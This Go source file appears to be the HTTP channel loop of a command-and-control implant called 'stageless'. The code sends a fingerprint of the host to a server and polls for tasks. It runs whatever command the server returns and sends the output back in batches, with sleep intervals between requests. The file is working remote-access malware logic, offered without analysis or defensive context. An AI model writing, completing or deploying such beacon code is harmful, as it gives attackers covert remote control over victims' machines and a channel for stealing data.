package routine

import (
	"stageless/capabilities"
	"stageless/utils/actions"
	global "stageless/utils"
	"stageless/utils/network"
	"stageless/utils/tasks"
)

func returnOutput() {
	// Sends the pending http output and clears the finished tasks
	if !tasks.CheckOutput() {
		return
	}
	batch := tasks.GetOutput()
	sent := network.SendBatch(batch)
	tasks.ClearTasks(sent.OK, sent.Body)
}

func HTTPMain() {
	// Main function of the http channel loop
	actions.SendFingerprint()
	for {
		boot := network.SendRequest(global.HostTag)
		if boot.OK && boot.Code == 200 {
			break
		}
		if boot.Code == 400 && actions.IsMissingHostResponse(boot.Body) {
			actions.SendFingerprint()
		}
		capabilities.Sleep_now()
	}
	for {
		returnOutput()
		capabilities.Sleep_now()
		resp := network.SendRequest(global.HostTag)
		if resp.Code == 400 && actions.IsMissingHostResponse(resp.Body) {
			actions.SendFingerprint()
		} else if resp.OK && len(resp.Body) > 0 {
			tasks.RunCommand(resp.Body)
			returnOutput()
		}
		if global.SecondDelayEnabled {
			capabilities.Sleep_now(global.SecondDelay)
			returnOutput()
		}
	}
}
